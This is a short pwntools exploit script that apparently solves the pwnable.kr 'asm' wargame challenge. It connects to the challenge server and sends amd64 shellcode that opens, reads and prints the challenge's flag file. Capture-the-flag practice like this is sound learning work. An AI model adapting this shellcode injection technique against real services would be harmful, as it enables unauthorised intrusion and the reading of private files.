from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = remote('pwnable.kr', 9026)

shellcode = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0)

shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

p.recvuntil('shellcode: ')
p.sendline(asm(shellcode))

p.interactive()